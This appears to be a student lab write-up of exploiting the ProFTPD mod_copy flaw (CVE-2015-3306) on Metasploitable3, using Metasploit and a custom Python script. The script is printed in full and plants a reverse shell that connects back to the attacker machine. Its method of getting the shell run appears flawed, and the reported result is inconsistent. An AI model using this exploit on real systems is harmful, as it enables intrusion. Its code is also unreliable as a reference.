# Phase 1: Setup and Compromise the Service

## Vulnerable Service Selection
For this project, we targeted the **ProFTPD** service on Metasploitable3. This FTP server contains a well-known vulnerability (mod_copy module) that allows an attacker to copy files within the target system without authentication.

## Environment Setup

### Victim Environment 
- **VM**: Metasploitable3 
- **IP Address**: 192.168.56.104
- **Vulnerable Service**: ProFTPD with mod_copy module enabled

### Attacker Environment
- **VM**: Kali Linux
- **IP Address**: 192.168.56.102
- **Tools**: Metasploit Framework, Custom Python Exploit

## Attack Execution

### Method 1: Using Metasploit Framework

The first attack method utilized the Metasploit Framework's `unix/ftp/proftpd_modcopy_exec` module to exploit the vulnerable ProFTPD service.

#### Steps:
1. Initiated Metasploit and selected the appropriate exploit module
2. Set the necessary parameters:
   - RHOSTS: 192.168.56.104 (Target IP)
   - LHOST: 192.168.56.102 (Attacker IP)
   - SITEPATH: /var/www/html (Web directory)
3. Executed the exploit, gaining a reverse shell on the target system

#### Exploit Execution:
![Metasploit Exploitation](https://github.com/Jaijer/Security_Project/blob/main/Phase1/img1.jpeg?raw=true)

The exploit successfully:
- Connected to the FTP server
- Executed the mod_copy commands to place a PHP webshell
- Established a reverse shell connection back to our attacking machine

### Method 2: Using Custom Python Script

We developed a custom Python script that replicates the functionality of the Metasploit module but leverages Python's ftplib to interact with the ProFTPD server.

#### Script Overview:
```python
import ftplib
import socket
import sys
import threading
import time
# Configuration
RHOST = "192.168.56.104"
LHOST = "192.168.56.102"
LPORT = 4444
SITEPATH = "/var/www/html/shell.py"
FTP_PORT = 21
# Reverse shell command
payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"""
# Listener function
def start_listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LHOST, LPORT))
    s.listen(1)
    print(f"[+] Listening on {LHOST}:{LPORT}...")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")
    while True:
        try:
            cmd = input("$ ")
            if not cmd:
                continue
            conn.send(cmd.encode() + b"\n")
            response = conn.recv(4096).decode()
            print(response)
        except KeyboardInterrupt:
            conn.close()
            s.close()
            break
# Start listener in a background thread
listener_thread = threading.Thread(target=start_listener)
listener_thread.daemon = True
listener_thread.start()
# FTP connection
try:
    ftp = ftplib.FTP()
    ftp.connect(RHOST, FTP_PORT)
    ftp.login("anonymous", "anonymous@")
    print("[+] Logged in anonymously")
    # Use SITE CPFR to prepare for file creation
    ftp.sendcmd(f"SITE CPFR /dev/stdin")
    print("[+] SITE CPFR /dev/stdin")
    # Use SITE CPTO to create the file in the web directory
    ftp.sendcmd(f"SITE CPTO {SITEPATH}")
    print(f"[+] SITE CPTO {SITEPATH}")
    # Send the payload via APPE
    ftp.storlines("APPE /dev/stdin", iter(payload.splitlines(keepends=True)))
    print("[+] Payload sent")
    ftp.quit()
    print("[+] FTP session closed")
except Exception as e:
    print(f"[!] Error: {e}")
    sys.exit(1)
# Wait for the listener to catch the shell
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Exiting...")
```

The script works by:
1. Setting up a listener for the reverse shell
2. Connecting to the FTP server anonymously
3. Using the SITE CPFR and SITE CPTO commands to abuse the mod_copy module
4. Placing a Python reverse shell in the web directory
5. Executing the shell to establish a connection back to our attacker machine

#### Custom Script Execution:
![Custom Script Exploitation](https://github.com/Jaijer/Security_Project/blob/main/Phase1/img2.jpeg?raw=true)

The custom script successfully:
- Connected to the FTP server anonymously
- Used the SITE CPFR and CPTO commands
- Received an error that the file exists, demonstrating the vulnerability
- Established a reverse shell connection (as seen in our listening session)

## Vulnerability Analysis

The ProFTPD mod_copy module vulnerability (CVE-2015-3306) allows remote attackers to read and write to arbitrary files on the system via the SITE CPFR and SITE CPTO commands. This vulnerability exists because:

1. The mod_copy module allows copying files between locations on the server
2. No authentication is required to use these commands
3. The module doesn't properly restrict where files can be copied to or from

This vulnerability is particularly dangerous as it allows attackers to:
- Write malicious files to web directories
- Execute arbitrary code on the target system
- Create backdoors for persistent access

## Conclusion

We successfully compromised the ProFTPD service on Metasploitable3 using both Metasploit and a custom Python script. The vulnerability in the mod_copy module allowed us to place a reverse shell on the target system and execute arbitrary commands, demonstrating the severe impact of this security flaw.

In Phase 2, we will analyze the logs from both the victim and attacker machines to better understand the attack patterns and indicators of compromise.
